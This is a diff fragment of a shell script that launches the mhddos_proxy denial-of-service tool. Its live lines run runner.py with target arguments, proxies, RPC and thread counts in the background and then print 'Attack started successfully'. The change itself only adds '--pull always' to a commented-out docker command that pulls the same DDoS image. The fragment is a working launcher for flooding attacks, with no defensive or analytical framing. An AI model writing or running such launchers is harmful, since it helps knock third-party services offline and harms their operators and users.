@@ -110,7 +110,7 @@ do
             echo "sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
             
             cd ~/mhddos_proxy
-            #sudo docker run -d -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
+            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
             sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
             echo -e "\n\033[42mAttack started successfully\033[0m\n"
    	done
